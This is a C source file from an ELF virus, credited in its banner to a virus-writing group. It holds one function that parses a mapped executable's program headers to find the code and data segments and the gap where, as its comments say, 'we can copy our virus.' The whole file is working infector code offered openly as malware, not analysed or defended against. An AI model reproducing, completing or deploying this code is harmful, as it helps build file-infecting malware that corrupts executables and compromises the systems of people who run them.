/*
     .........................................................
     :         ____ ___.__. ____   ____  _______  ___        :
     :       _/ ___<   |  |/    \_/ __ \/  _ \  \/  /        :
     :       \  \___\___  |   |  \  ___(  <_> >    <         :
     :        \___  > ____|___|  /\___  >____/__/\_ \        :
     :            \/\/         \/     \/           \/        :
     :                   __www.cyneox.tk_                    :
     :                                                       :
     :                                                       :
     :                        member of                      :
     :                                                       :
     :             _______  _________     _____              :
     :            \______ \ \_   ___ \   /  _  \             :
     :             |    |  \/    \  \/  /  /_\  \            :
     :             |    `   \     \____/    |    \           :
     :            /_______  /\______  /\____|__  /           :
     :                    \/        \/         \/            :
     :                ( Dark Coderz Alliance )               :
     :                   __www.dca-vx.tk__                   :
     :.......................................................:

*/

/* 
    Description : get_segment searches for segments in the maped file and updates 
                  our global structure "Infect" with the offsets of the needed segments.
*/

#include "defines.h"

int get_segment(Infect *file)
{
	Elf32_Phdr *phdr,*phdr_data,*phdr_code;
	unsigned int num_load=0;                  /* number of LOAD segments */
	unsigned int num;

	/* move to ehdr->e_phoff ( offset to first PHDR entry ) */
	phdr=file->phdr=(Elf32_Phdr*)(file->mmap.byte+file->mmap.ehdr->e_phoff);
	
	file->phdr_dyn=0;
	
	/* loop through PHDR entries in searching for our code section */
	for(num=file->mmap.ehdr->e_phnum;num > 0 ; num--,phdr++)
	{
		
		/* REMEMBER: static executables have the code segment at index 0 : phdr[0]
		 *           dynamically executables have the code segment at index 2: phdr[2]
		 * *NOTE   : in any case the program header of the code segment is followed
		 *           by the program header of the data segment                    */
		 
		
		switch(phdr->p_type)                /* defined in /usr/include/elf.h (Elf32_Phdr) */
		{
		
                    /* if we found a LOAD(loadable) segment then increase num_load and update 
		       phdr_data with the address of that segment.REMEMBER: in our file there
		       must be at least 2 LOAD segments( code segment and data segment) so that
		       we can copy our virus between those segments. phdr_data will be the address
		       of the last LOAD segment which is in our case the data segment.
		    */

		    case PT_LOAD:num_load++;phdr_data=phdr;break;
		    case PT_DYNAMIC:file->phdr_dyn=phdr;break;
		}
	}

	/* As I told you before we need at least 2 LOAD segments to be able
	   to infect our file...
	*/

	if(num_load!=2) return false;
	if(!(long)phdr_data) return false;
	

        /* phdr_data - 1 must be the code segment ;6) */
	file->phdr_code=phdr_code=phdr_data -1;

	/* check if DATA and CODE segment are loadable */
	if(phdr_code->p_type!=PT_LOAD && phdr_data->p_type!=PT_LOAD) return 1;

	/* check if p_filesz and p_memsz are the same */
	if(phdr_code->p_filesz!=phdr_code->p_memsz) return 1;

	/* first byte after the code segment... */
	file->end_of_codes=phdr_code->p_offset+phdr_code->p_filesz;
	file->aligned_end_of_codes=ALIGN_UP(file->end_of_codes);

      	return true;
}
	
